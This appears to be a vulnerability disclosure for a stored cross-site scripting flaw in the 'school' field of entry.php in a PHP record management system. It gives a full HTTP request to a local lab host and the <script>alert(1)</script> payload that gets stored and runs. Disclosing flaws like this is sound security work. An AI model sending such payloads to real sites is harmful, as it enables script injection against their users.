### VUL_AUTHOR:zhangwei
# Record management system – Stored XSS on (entry.php school parameter) 
## Vendor Homepage:
https://www.sourcecodester.com/php/5107/record-management-system.html 
## Version:V1.0
## Tested on: PHP, Apache, MySQL
## Affected Page:
entry.php 

On this page, school parameter is vulnerable to Stored XSS Attack 
## Proof of vulnerability:
### Request:
```
POST http://192.168.0.100/Personnel_record_management_system/entry.php HTTP/1.1
Host: 192.168.0.100
Content-Length: 19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.100
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.100/Personnel_record_management_system/entry.php
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=52388hjgjeif4bl4r5sqp2bmpm
Connection: close

school=1<script>alert(1)</script>&add_entry=
```
### Payload：
<script>alert(1)</script>

<img width="416" alt="image" src="https://github.com/user-attachments/assets/0714b1a1-ac81-41cf-a222-5b1bbe86dadb">

## Trigger popup(The data has been stored in the database)：
<img width="416" alt="image" src="https://github.com/user-attachments/assets/b2eaa4c8-e832-44ed-98a1-1f2157a55d63">

